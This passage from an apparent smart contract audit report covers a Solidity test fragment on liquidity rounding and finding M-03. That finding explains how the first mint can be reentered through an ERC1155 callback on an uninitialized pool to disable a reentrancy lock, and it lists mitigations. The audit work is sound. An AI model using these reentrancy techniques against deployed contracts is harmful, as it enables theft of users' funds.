+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                amount0
+            );
+
+        // remove liquidity in pieces    
+        uint halfAmount = amount0/2;
+        uint remaining = amount0-halfAmount;
+
+        uint128 liquidityRemoval1 = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                halfAmount
+            );
+        uint128 liquidityRemoval2 = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                remaining
+            );
+    
+        assert(liquidityMinted - (liquidityRemoval1 + liquidityRemoval2) > 0);
+    }
+
+    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
+        return this.onERC1155Received.selector;
+    }
+
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Modify the premia calculation or use `uint256` for storing premia

# <a id='M-03'></a>M-03 Reentrancy lock can be disabled for the first mint

## Impact
The first mint can be reentered. In case the ERC777 transfer hook vulnerability is protected using a reentrancy lock, this will allow the attacker to perform the attack.
The team has used reentrancyLock for mints and burns and if there was some assumption it would break 

## Proof of Concept
In `mintTokenizedPosition` function the existance of the pool is only checked after minting the ERC1155 token
```solidity
    function mintTokenizedPosition(
        uint256 tokenId,
        uint128 positionSize,
        int24 slippageTickLimitLow,
        int24 slippageTickLimitHigh
    )
        external
        ReentrancyLock(tokenId.univ3pool())
        returns (int256 totalCollected, int256 totalSwapped, int24 newTick)
    {
        
        _mint(msg.sender, tokenId, positionSize);

        emit TokenizedPositionMinted(msg.sender, tokenId, positionSize);

       // @audit existance of pool is checked inside this function
        (totalCollected, totalSwapped, newTick) = _validateAndForwardToAMM(
```
```solidity
    function _validateAndForwardToAMM(
        uint256 tokenId,
        uint128 positionSize,
        int24 tickLimitLow,
        int24 tickLimitHigh,
        bool isBurn
    ) internal returns (int256 totalCollectedFromAMM, int256 totalMoved, int24 newTick) {
        
        ..........

        IUniswapV3Pool univ3pool = s_poolContext[tokenId.validate()].pool;


        // Revert if the pool not been previously initialized
        if (univ3pool == IUniswapV3Pool(address(0))) revert Errors.UniswapPoolNotInitialized();
```
This allows an attacker to call the `mintTokenizedPosition` function on an uninitialized pool and initialize it by reentering `SemiFungiblePositionManager` via the ERC1155 `onERC1155Received` call. Initializing a pool will set its reentrancy lock to false.

## Tools Used
Manual review

## Recommended Mitigation Steps
Check whether the pool is initialized before minting the token
